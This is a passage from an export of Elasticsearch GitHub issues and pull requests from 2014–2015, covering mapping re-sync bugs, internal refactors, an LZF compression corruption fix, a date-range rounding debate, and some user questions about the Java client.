</comment><comment author="clintongormley" created="2014-08-11T10:46:43Z" id="51765536">I've reduced this to the following, which reproduces the problem:

```
PUT /t
{
  "mappings": {
    "profiles_v1": {
      "properties": {
        "fullName": {
          "type": "string",
          "fields": {
            "one": {
              "type": "string"
            },
            "two": {
              "type": "string"
            },
            "three": {
              "type": "string"
            },
            "completion": {
              "type": "string"
            },
            "four": {
              "type": "string"
            },
            "ngrams_front_omit_norms": {
              "type": "string"
            },
            "ngrams_back": {
              "type": "string"
            },
            "ngrams_back_omit_norms": {
              "type": "string"
            },
            "ngrams_middle": {
              "type": "string"
            },
            "shingle": {
              "type": "string"
            },
            "ngrams_front": {
              "type": "string"
            },
            "fullName": {
              "type": "string"
            }
          }
        }
      }
    }
  }
}
```

When it tries to compare the mappings here https://github.com/elasticsearch/elasticsearch/blob/master/src/main/java/org/elasticsearch/cluster/metadata/MetaDataMappingService.java#L270 the fields are in a different order.

`mapper.mappingSource` returns the fields in the same order as above, while `builders.mapping(type).source()` moves the `ngrams_middle` field to the end:

```
{
  "profiles_v1": {
    "properties": {
      "fullName": {
        "type": "string",
        "fields": {
          "fullName": {
            "type": "string"
          },
          "two": {
            "type": "string"
          },
          "completion": {
            "type": "string"
          },
          "four": {
            "type": "string"
          },
          "three": {
            "type": "string"
          },
          "ngrams_front_omit_norms": {
            "type": "string"
          },
          "ngrams_back": {
            "type": "string"
          },
          "ngrams_back_omit_norms": {
            "type": "string"
          },
          "shingle": {
            "type": "string"
          },
          "one": {
            "type": "string"
          },
          "ngrams_front": {
            "type": "string"
          },
          "ngrams_middle": {
            "type": "string"
          }
        }
      }
    }
  }
}
```
</comment><comment author="AVVS" created="2014-08-11T11:09:31Z" id="51767305">Ok, any easy fix to temporarily allow it to sync properly? i.e., put same mapping with different field order
</comment><comment author="clintongormley" created="2014-08-11T12:16:16Z" id="51772348">@AVVS that _may_ work, or changing field names might work as well.  We're working on a fix.
</comment><comment author="martijnvg" created="2014-08-11T17:27:48Z" id="51812196">@AVVS Thanks for reporting this issue, the re-syncing of the mapping was causing by multi-fields not being serialised consistently and this is fixed now.
</comment><comment author="AVVS" created="2014-08-11T17:32:03Z" id="51812761">Thanks, when should I expect 1.3.2 to be released? :)
</comment><comment author="martijnvg" created="2014-08-11T17:33:31Z" id="51812951">@AVVS I expect a 1.3.2 release in the coming days.
</comment><comment author="heffergm" created="2015-04-13T20:46:12Z" id="92493459">I'm not entirely clear on the status of this bug, but wanted to report that under 1.5 and now 1.5.1 (potentially under 1.4.x as well, but I can't confirm that) we've run into the endless re-syncing mappings issue.

I can provide any further details you'd like, let me know.
</comment><comment author="clintongormley" created="2015-04-14T13:02:45Z" id="92816247">@heffergm please could you open a new bug, and upload your mappings?
</comment><comment author="clintongormley" created="2015-04-14T13:04:29Z" id="92816646">@heffergm I see you already have :) #10581
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Refactored TransportSingleCustomOperationAction, subclasses and requests</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7214</link><project id="" key="" /><description>`TransportSingleCustomOperationAction` is subclassed by two similar, yet different transport actions: `TransportAnalyzeAction` and `TransportGetFieldMappingsIndexAction`. Made their difference and similarities more explicit by sharing common code and moving specific code to subclasses:
- moved index field to the parent `SingleCustomOperationAction` class
- moved the common check blocks code to the parent transport action class
- moved the main transport handler to the `TransportAnalyzeAction` subclass as it is only used to receive external requests through clients. In the case of the `TransportGetFieldMappingsIndexAction` instead, the action is internal and executed only locally as part of the user facing `TransportGetFieldMappingsAction`. The corresponding request gets sent over the transport though as part of the related shard request
- removed the get field mappings index action from the action names mapping as it is not a transport handler anymore. It was before although never used.
</description><key id="39875466">7214</key><summary>Refactored TransportSingleCustomOperationAction, subclasses and requests</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/javanna/following{/other_user}', u'events_url': u'https://api.github.com/users/javanna/events{/privacy}', u'organizations_url': u'https://api.github.com/users/javanna/orgs', u'url': u'https://api.github.com/users/javanna', u'gists_url': u'https://api.github.com/users/javanna/gists{/gist_id}', u'html_url': u'https://github.com/javanna', u'subscriptions_url': u'https://api.github.com/users/javanna/subscriptions', u'avatar_url': u'https://avatars1.githubusercontent.com/u/832460?v=4', u'repos_url': u'https://api.github.com/users/javanna/repos', u'received_events_url': u'https://api.github.com/users/javanna/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/javanna/starred{/owner}{/repo}', u'site_admin': False, u'login': u'javanna', u'type': u'User', u'id': 832460, u'followers_url': u'https://api.github.com/users/javanna/followers'}</assignee><reporter username="">javanna</reporter><labels><label>:Internal</label><label>enhancement</label><label>v1.4.0.Beta1</label><label>v2.0.0-beta1</label></labels><created>2014-08-09T01:33:24Z</created><updated>2015-06-07T12:27:01Z</updated><resolved>2014-08-11T09:09:07Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="javanna" created="2014-08-11T08:19:28Z" id="51752805">Updated according to review's comment
</comment><comment author="jpountz" created="2014-08-11T08:55:43Z" id="51755810">LGTM
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Aggregation equivalent of TermFacet.getOtherCount()</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7213</link><project id="" key="" /><description>There does not appear to be a way to replicate this feature with the current aggregation API.
</description><key id="39875325">7213</key><summary>Aggregation equivalent of TermFacet.getOtherCount()</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">ejain</reporter><labels /><created>2014-08-09T01:26:28Z</created><updated>2014-08-09T09:24:59Z</updated><resolved>2014-08-09T09:24:59Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="clintongormley" created="2014-08-09T09:24:59Z" id="51681947">Duplicate of #5324
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>XContentBuilder.map(Map) method modified to use a wildcard for value's type.</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7212</link><project id="" key="" /><description>The XContentBuilder.map(Map&lt;String, Object&gt;) method could be modified to use a wildcard for value's type.

This could make the API slightly more convenient. 
For exemple, when I got a org.elasticsearch.common.settings.Settings and call getAsMap(), it returns a Map&lt;String, String&gt; that can not be passed to map(Map&lt;String, Object&gt;).

Users of the current API are forced to pass a Map&lt;String, Object&gt;, but any reference with such type can be passed to Map&lt;String, ?&gt;, so they will require no changes.
Consumers of a Map&lt;String, ?&gt; get Object as type for the entry.getValue(), as in XContentBuilder.writeMap(), so it will require no changes here.

This could be backported easily to other branches.
</description><key id="39866229">7212</key><summary>XContentBuilder.map(Map) method modified to use a wildcard for value's type.</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/jpountz/following{/other_user}', u'events_url': u'https://api.github.com/users/jpountz/events{/privacy}', u'organizations_url': u'https://api.github.com/users/jpountz/orgs', u'url': u'https://api.github.com/users/jpountz', u'gists_url': u'https://api.github.com/users/jpountz/gists{/gist_id}', u'html_url': u'https://github.com/jpountz', u'subscriptions_url': u'https://api.github.com/users/jpountz/subscriptions', u'avatar_url': u'https://avatars2.githubusercontent.com/u/299848?v=4', u'repos_url': u'https://api.github.com/users/jpountz/repos', u'received_events_url': u'https://api.github.com/users/jpountz/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/jpountz/starred{/owner}{/repo}', u'site_admin': False, u'login': u'jpountz', u'type': u'User', u'id': 299848, u'followers_url': u'https://api.github.com/users/jpountz/followers'}</assignee><reporter username="">obourgain</reporter><labels><label>:Java API</label><label>enhancement</label><label>v1.4.0.Beta1</label><label>v2.0.0-beta1</label></labels><created>2014-08-08T21:51:37Z</created><updated>2015-06-07T12:27:12Z</updated><resolved>2014-08-11T08:44:34Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="jpountz" created="2014-08-11T07:35:28Z" id="51749757">@obourgain The change looks good to me.  Could I ask you to sign the CLA so that I can get it merged in?
http://www.elasticsearch.org/contributor-agreement/
</comment><comment author="obourgain" created="2014-08-11T07:57:04Z" id="51751245">I just signed it.
</comment><comment author="jpountz" created="2014-08-11T08:44:34Z" id="51754854">@obourgain Merged, thanks!
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Removed needless serialization code from TransportIndexReplicationAction and corresponding request object</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7211</link><project id="" key="" /><description>TransportIndexReplicationAction is always executed locally, as an internal action that is part of either delete by query or delete (when routing is required but not specified). Only the corresponding shard level requests get sent over the transport, hence no transport endpoint is needed for the index version, nor the index request itself is supposed to be sent over the transport.

Made all index requests fields final and removed `validate` methods from index requests as we can rely on validation performed by the callers on main transport actions. No need to validate it again as the request doesn't even get sent over the transport.

Moved classes from `org.elasticsearch.action.delete.index` to `org.elasticsearch.action.delete` and adjusted visibility so that internal requests are not public anymore.

Also removed serialization code from IndexDeleteResponse as it never gets sent over transport either.
</description><key id="39853106">7211</key><summary>Removed needless serialization code from TransportIndexReplicationAction and corresponding request object</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/javanna/following{/other_user}', u'events_url': u'https://api.github.com/users/javanna/events{/privacy}', u'organizations_url': u'https://api.github.com/users/javanna/orgs', u'url': u'https://api.github.com/users/javanna', u'gists_url': u'https://api.github.com/users/javanna/gists{/gist_id}', u'html_url': u'https://github.com/javanna', u'subscriptions_url': u'https://api.github.com/users/javanna/subscriptions', u'avatar_url': u'https://avatars1.githubusercontent.com/u/832460?v=4', u'repos_url': u'https://api.github.com/users/javanna/repos', u'received_events_url': u'https://api.github.com/users/javanna/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/javanna/starred{/owner}{/repo}', u'site_admin': False, u'login': u'javanna', u'type': u'User', u'id': 832460, u'followers_url': u'https://api.github.com/users/javanna/followers'}</assignee><reporter username="">javanna</reporter><labels><label>:Internal</label><label>enhancement</label><label>v1.4.0.Beta1</label><label>v2.0.0-beta1</label></labels><created>2014-08-08T19:01:51Z</created><updated>2015-06-07T12:27:21Z</updated><resolved>2014-08-11T08:02:41Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="jpountz" created="2014-08-11T07:20:55Z" id="51748810">LGTM
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Fix a very rare case of corruption in compression used for internal cluster communication.</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7210</link><project id="" key="" /><description>See CorruptedCompressorTests for details on how this bug can be hit.
</description><key id="39852173">7210</key><summary>Fix a very rare case of corruption in compression used for internal cluster communication.</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">rjernst</reporter><labels><label>:Internal</label><label>bug</label><label>v1.2.4</label><label>v1.3.2</label><label>v1.4.0.Beta1</label><label>v2.0.0-beta1</label></labels><created>2014-08-08T18:51:11Z</created><updated>2015-06-18T20:12:39Z</updated><resolved>2014-08-11T14:29:18Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="rmuir" created="2014-08-08T19:38:02Z" id="51647982">Please disable unsafe encode/decode complete.
- This may crash machines that don't allow unaligned reads: https://github.com/ning/compress/issues/18
- if (SUNOS) does not imply its safe to do such unaligned reads.
- This may corrupt data on bigendian systems: https://github.com/ning/compress/issues/37
- We do not test such situations.  
</comment><comment author="rjernst" created="2014-08-08T20:12:44Z" id="51651644">Ok, I think I addressed all the comments.  The only unchanged thing is the license file, because I don't know which license to put in there (the original file had no license header).
</comment><comment author="rjernst" created="2014-08-09T19:03:45Z" id="51695562">The PR to the compress-lzf project was merged, and a 1.0.2 release was made.  I removed the X encoder and made the upgrade to 1.0.2.
</comment><comment author="rmuir" created="2014-08-11T12:57:29Z" id="51775959">looks good, thanks Ryan.
</comment><comment author="jpountz" created="2014-08-11T12:58:29Z" id="51776059">+1 as well
</comment><comment author="rjernst" created="2014-08-11T14:29:18Z" id="51787278">Thanks. Pushed.
</comment><comment author="taf2" created="2015-06-18T20:00:30Z" id="113273708">Upgrading from 1.1.1 to 1.6.0 and noticing this output from our cluster

``````
insertOrder timeInQueue priority source
      37659        27ms HIGH     shard-failed ([callers][2], node[Ko3b9KsESN68lTkPtVrHKw], relocating [4mcZCKvBRoKQJS_StGNPng], [P], s[INITIALIZING]), reason [shard failure [failed recovery][RecoveryFailedException[[callers][2]: Recovery failed from [aws_el1][4mcZCKvBRoKQJS_StGNPng][ip-10-55-11-210][inet[/10.55.11.210:9300]]{rack=useast1, master=true, zone=zonea} into [aws_el1a][Ko3b9KsESN68lTkPtVrHKw][ip-10-55-11-211][inet[/10.55.11.211:9300]]{rack=useast1, zone=zonea, master=true} (unexpected error)]; nested: ElasticsearchIllegalStateException[Can't recovery from node [aws_el1][4mcZCKvBRoKQJS_StGNPng][ip-10-55-11-210][inet[/10.55.11.210:9300]]{rack=useast1, master=true, zone=zonea} with [indices.recovery.compress : true] due to compression bugs -  see issue #7210 for details]; ]]```

what do we do?
``````
</comment><comment author="rjernst" created="2015-06-18T20:02:47Z" id="113274139">@taf2 Turn off compression before upgrading.
</comment><comment author="taf2" created="2015-06-18T20:04:57Z" id="113274545">@rjernst thanks! which kind of compression do we disable...

is it this option in

/etc/elasticsearch/elasticsearch.yml
#transport.tcp.compress: true

?

or another option?
</comment><comment author="taf2" created="2015-06-18T20:06:01Z" id="113274867">okay sorry it looks like we need to disable indices.recovery.compress - but is this something that needs to be disabled on all nodes in the cluster or just the new 1.6.0 node we're starting up now?
</comment><comment author="rjernst" created="2015-06-18T20:07:08Z" id="113275089">All nodes in the cluster, before starting the upgrade. The problem is old nodes with this setting enabled would use the old buggy code, which can then cause data copied between and old and new node to become corrupted.
</comment><comment author="taf2" created="2015-06-18T20:10:20Z" id="113275780">excellent thank you - we have run the following on the existing cluster:

```
curl -XPUT localhost:9200/_cluster/settings -d '{"transient" : {"indices.recovery.compress" : false }}'
```
</comment><comment author="taf2" created="2015-06-18T20:12:39Z" id="113276349">Thank you that did the trick!
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Completion &amp; Context Suggester: Support expressions for suggestion scoring</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7209</link><project id="" key="" /><description>Currently users have to explicitly set score to suggestion entries via the `weight` parameter, while indexing. It would be nice to be able to just specify an `expression` instead and also accept hard-coded values (as done today).

If a weight of a suggestion is calculated by a combination of field values (`popularity`, `recency` for example), then the following format can be used:

``` bash
curl -X PUT 'localhost:9200/music/song/1?refresh=true' -d '{
    "name": ...,
    "suggest": {
        "input": [
           ...
        ],
        "output": ...,
        "payload": {
            ...
        },
        "weight": "doc['popularity'].value * 0.8 + doc['recency'].value * 0.2"
    }
}'
```

the example above assumes `popularity` and `recency` to be already defined in the mapping and both have `Numeric` values.

related #6818
</description><key id="39841511">7209</key><summary>Completion &amp; Context Suggester: Support expressions for suggestion scoring</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">open</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/areek/following{/other_user}', u'events_url': u'https://api.github.com/users/areek/events{/privacy}', u'organizations_url': u'https://api.github.com/users/areek/orgs', u'url': u'https://api.github.com/users/areek', u'gists_url': u'https://api.github.com/users/areek/gists{/gist_id}', u'html_url': u'https://github.com/areek', u'subscriptions_url': u'https://api.github.com/users/areek/subscriptions', u'avatar_url': u'https://avatars1.githubusercontent.com/u/753679?v=4', u'repos_url': u'https://api.github.com/users/areek/repos', u'received_events_url': u'https://api.github.com/users/areek/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/areek/starred{/owner}{/repo}', u'site_admin': False, u'login': u'areek', u'type': u'User', u'id': 753679, u'followers_url': u'https://api.github.com/users/areek/followers'}</assignee><reporter username="">areek</reporter><labels><label>:Suggesters</label><label>feature</label></labels><created>2014-08-08T16:41:54Z</created><updated>2016-11-25T18:29:12Z</updated><resolved /><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="clintongormley" created="2016-11-25T18:29:11Z" id="263008483">@areek do you plan to pick this up at some stage?</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Function Score Query Java API Not working with Multiple Filters</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7208</link><project id="" key="" /><description>I am using elasticsearch 1.3.1 version. I am facing a unique problem with FunctionScore Query Java API. I am placing a bool filter inside the function score query in an effort to combine multiple queries. But the problem is, with only a single filter as part of the bool filter it is working fine. The moment I add another filter to the bool filter, the client is getting stuck and I am getting a timeout exception. However the same with curl is working. Please help me in this regard. My query is 

{
  "function_score" : {
    "filter" : {
      "bool" : {
        "should" : [ {
          "term" : {
            "showId" : "85ef1da5-db78-3fd2-86a4-8c9ff3f053d0"
          }
        }, {
          "term" : {
            "showId" : "e275549d-143e-37e8-8689-44a805b957da"
          }
        } ]
      }
    },
    "functions" : [ {
      "filter" : {
        "term" : {
          "showId" : "85ef1da5-db78-3fd2-86a4-8c9ff3f053d0"
        }
      },
      "boost_factor" : 40.0
    }, {
      "filter" : {
        "term" : {
          "showId" : "e275549d-143e-37e8-8689-44a805b957da"
        }
      },
      "boost_factor" : 35.0
    } ]
  }
}
</description><key id="39840007">7208</key><summary>Function Score Query Java API Not working with Multiple Filters</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">rjagirdar</reporter><labels /><created>2014-08-08T16:27:14Z</created><updated>2014-08-08T17:23:18Z</updated><resolved>2014-08-08T16:59:18Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="clintongormley" created="2014-08-08T16:59:18Z" id="51629247">Hi @rjagirdar 

This issues list is for bug reports and feature requests. Please use the forum for questions like this.  Also, as curl, your query works fine for me.  You say you're having a problem with the Java API, but you don't show us what you're doing in Java.  I suggest you include the Java code and the curl example when you email the forum
</comment><comment author="rjagirdar" created="2014-08-08T17:07:12Z" id="51630139">Sorry for posting this here. Here is my java code, which is throwing up the issue. Please help me out.

public static ArrayList&lt;String&gt; getShowIds(){
        ArrayList&lt;String&gt; showIds = new ArrayList&lt;String&gt;();
        showIds.add("85ef1da5-db78-3fd2-86a4-8c9ff3f053d0");
        showIds.add("e275549d-143e-37e8-8689-44a805b957da");
        return showIds;
    }

```
public static void functionScoreQueryAudio(InstanceType type){
    TransportClient client = null;
    int show_base=40; int show_step=5;
    try{
        if(type==InstanceType.EC2)
             client = getClient(InstanceType.EC2);
         else
             client = getClient(InstanceType.LOCAL);
        System.out.println("Client Created");

        BoolFilterBuilder boolFilterBuilder = FilterBuilders.boolFilter();
        FunctionScoreQueryBuilder queryBuilder = QueryBuilders.functionScoreQuery(boolFilterBuilder);
        int i=0;
        for(String str : getShowIds()){
            boolFilterBuilder.should(FilterBuilders.termFilter("showId", str));
            queryBuilder.add(FilterBuilders.termFilter("showId", str),ScoreFunctionBuilders.factorFunction(show_base-(i*show_step)));
            i++;
        }

        SearchResponse response = client.prepareSearch("audio").
                setQuery(queryBuilder).setFrom(0).setSize(200).execute().actionGet(TimeValue.timeValueSeconds(50));

        if(response.getHits().totalHits()&gt;0){

            for(SearchHit hit : response.getHits()){
                System.out.println(hit.getScore());
                System.out.println(hit.getSourceAsString());
                System.out.println("===========================================================================================================================");
            }
            System.out.println(response.getHits().totalHits()+" "+response.getTookInMillis());
        }
        else
            System.out.println("No Records Found");



    }
    catch(Exception ex){
        System.out.println(ex.getMessage());
    }
}
```
</comment><comment author="clintongormley" created="2014-08-08T17:23:18Z" id="51632056">Like I said, please use the forums for this.
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Add suggestRequest to Requests and fix broken javadocs in client</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7207</link><project id="" key="" /><description>Added missing suggestRequest to Requests to fix broken java docs and updated suggest client javadocs

closes #7206
</description><key id="39836273">7207</key><summary>Add suggestRequest to Requests and fix broken javadocs in client</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">areek</reporter><labels><label>:Java API</label><label>enhancement</label><label>v1.4.0.Beta1</label><label>v2.0.0-beta1</label></labels><created>2014-08-08T15:53:22Z</created><updated>2015-06-07T12:27:43Z</updated><resolved>2014-08-08T16:11:27Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="javanna" created="2014-08-08T15:55:13Z" id="51620497">LGTM
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Suggester: add suggestRequest to Requests and fix broken javadocs in client</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7206</link><project id="" key="" /><description /><key id="39836025">7206</key><summary>Suggester: add suggestRequest to Requests and fix broken javadocs in client</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/areek/following{/other_user}', u'events_url': u'https://api.github.com/users/areek/events{/privacy}', u'organizations_url': u'https://api.github.com/users/areek/orgs', u'url': u'https://api.github.com/users/areek', u'gists_url': u'https://api.github.com/users/areek/gists{/gist_id}', u'html_url': u'https://github.com/areek', u'subscriptions_url': u'https://api.github.com/users/areek/subscriptions', u'avatar_url': u'https://avatars1.githubusercontent.com/u/753679?v=4', u'repos_url': u'https://api.github.com/users/areek/repos', u'received_events_url': u'https://api.github.com/users/areek/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/areek/starred{/owner}{/repo}', u'site_admin': False, u'login': u'areek', u'type': u'User', u'id': 753679, u'followers_url': u'https://api.github.com/users/areek/followers'}</assignee><reporter username="">areek</reporter><labels><label>enhancement</label><label>v1.4.0.Beta1</label><label>v2.0.0-beta1</label></labels><created>2014-08-08T15:50:37Z</created><updated>2014-08-08T16:11:27Z</updated><resolved>2014-08-08T16:11:27Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments /><attachments /><subtasks /><customfields /></item><item><title>Validation of mappings request to reject unsupported fields</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7205</link><project id="" key="" /><description>At the moment the mappings request is not validated to ensure that all the specified fields are valid for the particular mapping type.  There are three types of field in a mapping field definition:
- type field - single field which indicates which field mapper to use
- common fields - fields which all types use (such as stored or indexed fields)
- type specific fields - fields which are unique to the particular field mapper

These types are parsed separately and the parser for each does not know (and should not know) what the valid fields for the other parsers are.  The solution is therefore for the parsers to remove the fields it processes and then a check to be made at the end to see if there are any fields which have not parsed  If there are any fields not parsed, these should be returned in an thrown exception.

This functionality has already been implemented for the root mappings in #6093
</description><key id="39834533">7205</key><summary>Validation of mappings request to reject unsupported fields</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/colings86/following{/other_user}', u'events_url': u'https://api.github.com/users/colings86/events{/privacy}', u'organizations_url': u'https://api.github.com/users/colings86/orgs', u'url': u'https://api.github.com/users/colings86', u'gists_url': u'https://api.github.com/users/colings86/gists{/gist_id}', u'html_url': u'https://github.com/colings86', u'subscriptions_url': u'https://api.github.com/users/colings86/subscriptions', u'avatar_url': u'https://avatars0.githubusercontent.com/u/236731?v=4', u'repos_url': u'https://api.github.com/users/colings86/repos', u'received_events_url': u'https://api.github.com/users/colings86/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/colings86/starred{/owner}{/repo}', u'site_admin': False, u'login': u'colings86', u'type': u'User', u'id': 236731, u'followers_url': u'https://api.github.com/users/colings86/followers'}</assignee><reporter username="">colings86</reporter><labels><label>enhancement</label><label>v2.0.0-beta1</label></labels><created>2014-08-08T15:34:43Z</created><updated>2015-03-19T15:01:27Z</updated><resolved>2014-11-12T15:19:09Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments /><attachments /><subtasks /><customfields /></item><item><title>Range filter with no value for from and to should be replaced by a match_all filter</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7204</link><project id="" key="" /><description>A range filter without any from/to value generates a range filter:`[* TO *]`.
It would be better to generate in that case a `match_all` filter.
</description><key id="39829151">7204</key><summary>Range filter with no value for from and to should be replaced by a match_all filter</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/dadoonet/following{/other_user}', u'events_url': u'https://api.github.com/users/dadoonet/events{/privacy}', u'organizations_url': u'https://api.github.com/users/dadoonet/orgs', u'url': u'https://api.github.com/users/dadoonet', u'gists_url': u'https://api.github.com/users/dadoonet/gists{/gist_id}', u'html_url': u'https://github.com/dadoonet', u'subscriptions_url': u'https://api.github.com/users/dadoonet/subscriptions', u'avatar_url': u'https://avatars3.githubusercontent.com/u/274222?v=4', u'repos_url': u'https://api.github.com/users/dadoonet/repos', u'received_events_url': u'https://api.github.com/users/dadoonet/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/dadoonet/starred{/owner}{/repo}', u'site_admin': False, u'login': u'dadoonet', u'type': u'User', u'id': 274222, u'followers_url': u'https://api.github.com/users/dadoonet/followers'}</assignee><reporter username="">dadoonet</reporter><labels /><created>2014-08-08T14:38:56Z</created><updated>2014-08-12T17:13:13Z</updated><resolved>2014-08-12T17:13:02Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="dadoonet" created="2014-08-12T17:13:02Z" id="51945549">After talking to @rmuir, this optimization won't give expected results. For example, when we have no value for the field, `match_all` will hit the document but `[* TO *]` won't.

Closing. We can imagine opening that issue on Lucene project.
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Inconsistent ceiling round up in range search for "lt" (less than)</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7203</link><project id="" key="" /><description>WIth range searches (default "mapping.date.round_ceil": true),  we have 
- gt, gte, from --- round off to floor
- lte, to --- round off to ceiling

However "lt" behaves inconsistently that it rounds off to floor. This is confusing in search behavior. It should instead also round off to ceiling by default. 

To replicate, just create an index with two documents, with past midnight and next midnight. Searching with "lt" matches none, "lte" matches both.

```
PUT dateround
{
  "settings": {
    "number_of_shards": 1
  }
}

PUT dateround/document/1
{
  "testdate" : "2014-08-08T00:00:00"
}

PUT dateround/document/2
{
  "testdate" : "2014-08-09T00:00:00"
}

GET dateround/document/_search
{
  "explain": false, 
  "query": {
    "filtered": {
      "query": {
        "match_all": {}
      },
      "filter": {
        "range": {
          "testdate": {
            "lt" : "now/d"
          }
        }
      }
    }
  }
}
```
</description><key id="39824829">7203</key><summary>Inconsistent ceiling round up in range search for "lt" (less than)</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/clintongormley/following{/other_user}', u'events_url': u'https://api.github.com/users/clintongormley/events{/privacy}', u'organizations_url': u'https://api.github.com/users/clintongormley/orgs', u'url': u'https://api.github.com/users/clintongormley', u'gists_url': u'https://api.github.com/users/clintongormley/gists{/gist_id}', u'html_url': u'https://github.com/clintongormley', u'subscriptions_url': u'https://api.github.com/users/clintongormley/subscriptions', u'avatar_url': u'https://avatars0.githubusercontent.com/u/56599?v=4', u'repos_url': u'https://api.github.com/users/clintongormley/repos', u'received_events_url': u'https://api.github.com/users/clintongormley/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/clintongormley/starred{/owner}{/repo}', u'site_admin': False, u'login': u'clintongormley', u'type': u'User', u'id': 56599, u'followers_url': u'https://api.github.com/users/clintongormley/followers'}</assignee><reporter username="">ajhalani</reporter><labels><label>docs</label><label>v1.5.0</label></labels><created>2014-08-08T13:54:25Z</created><updated>2014-11-10T15:07:38Z</updated><resolved>2014-11-10T15:07:38Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="clintongormley" created="2014-08-08T14:49:10Z" id="51611856">I agree it is confusing. I'm not convinced that we should ever round to ceiling.  I think it should always be floor, for `lt` and `lte`.
</comment><comment author="ajhalani" created="2014-08-08T15:57:29Z" id="51620788">Just curious why you feel that? The option "mapping.date.round_ceil:true" seems to indicate that it will be rounded to ceiling. 
If user wants to round to floor, we could/should set that option to false. 
</comment><comment author="clintongormley" created="2014-08-08T16:24:43Z" id="51624861">Well, I've thought about this before and the last time I thought it made sense, but now I can't remember why :)

If you say:

```
gte: 2014/01/10 08:52:16 /d
lte: 2014/01/11 08:52:16 /d
```

Then you mean:

```
gte: 2014/01/10 00:00:00
lte: 2014/01/11 00:00.00
```

Same goes for `lt`.  When does it make sense to round up instead of down?
</comment><comment author="ajhalani" created="2014-08-08T16:35:07Z" id="51626439">I thought that's what this option "mapping.date.round_ceil:true"  is currently doing, to round 
`lte: 2014/01/11 08:52:16 /d` to `lte: 2014/01/12 00:00.00` 

I might be wrong though as I'm sure you have more context. 
